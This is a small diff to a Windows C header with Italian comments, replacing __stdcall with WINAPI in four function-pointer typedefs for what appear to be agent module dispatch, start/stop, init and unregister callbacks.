@@ -57,10 +57,10 @@ typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
 extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
 void AM_SuspendRestart(DWORD);
 
-typedef DWORD (__stdcall *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
-typedef DWORD (__stdcall *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
-typedef DWORD (__stdcall *PMI_Generic_t) (JSONObject); // Prototipo per l'Init
-typedef DWORD (__stdcall *PMU_Generic_t) (void); // Prototipo per l'UnRegister
+typedef DWORD (WINAPI *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
+typedef DWORD (WINAPI *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
+typedef DWORD (WINAPI *PMI_Generic_t) (JSONObject); // Prototipo per l'Init
+typedef DWORD (WINAPI *PMU_Generic_t) (void); // Prototipo per l'UnRegister
 
 #define AM_MAXDISPATCH 50
 #define AGENT_NAME_LENGTH 32
